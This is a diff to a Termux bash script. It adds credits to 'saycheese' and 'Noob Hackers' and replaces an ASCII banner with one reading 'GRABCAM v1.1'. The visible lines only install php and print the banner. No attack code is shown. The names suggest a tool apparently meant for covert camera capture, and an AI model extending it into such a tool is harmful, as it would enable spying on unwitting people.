@@ -1,3 +1,9 @@
+#!/bin/bash
+# coded by: github.com/thelinuxchoice/saycheese
+# This script modified by Noob Hackers
+#@@2222222
+# Hearlty thanks for linuxchoice
+# If you use any part from this code, giving me the credits. Read the Lincense!
 clear
 termux-setup-storage
 pkg install php -y
@@ -8,15 +14,19 @@ trap 'printf "\n";stop' 2
 banner() {
 
 echo '
- /$$   /$$  /$$$$$$   /$$$$$$  /$$      /$$
-| $$$ | $$ /$$__  $$ /$$__  $$| $$$    /$$$
-| $$$$| $$| $$  \__/| $$  \ $$| $$$$  /$$$$
-| $$ $$ $$| $$      | $$$$$$$$| $$ $$/$$ $$
-| $$  $$$$| $$      | $$__  $$| $$  $$$| $$
-| $$\  $$$| $$    $$| $$  | $$| $$\  $ | $$
-| $$ \  $$|  $$$$$$/| $$  | $$| $$ \/  | $$
-|__/  \__/ \______/ |__/  |__/|__/     |__/_& v1.1 ' |lolcat
-                                                                             
+
+                             __
+                         __ /_/\___
+                        /__/[]\/__/|o-_
+                        |    _     ||   -_  
+                        |  ((_))   ||     -_
+                        |__________|/
+             ___  ____   __   ____   ___   __   _  _ 
+            / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
+           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
+            \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.1 ' |lolcat
+
+                                                                               
 echo " "
 printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
 printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
